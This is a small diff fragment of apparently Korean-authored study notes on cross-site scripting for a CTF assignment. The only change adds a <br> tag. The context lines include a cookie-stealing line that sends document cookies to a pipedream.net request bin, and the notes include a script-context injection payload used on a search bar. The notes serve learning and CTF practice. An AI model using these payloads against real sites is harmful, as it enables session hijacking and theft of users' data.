@@ -49,7 +49,7 @@ i.src = "http://enjt04rx79at.x.pipedream.net/?cookie=" + cookieData;
 
 ## Part 3. Assignment
 1. Review
-2. XSS CTF
+2. XSS CTF <br>
  a. CTF XSS 2
     - Error = Showing the direct sentence on HTML => <script>alert('x에 대한 검색 결과가 존재하지 않습니다.');</script>
     - Check Attack statement on search bar => xss');alert(1);var i=('
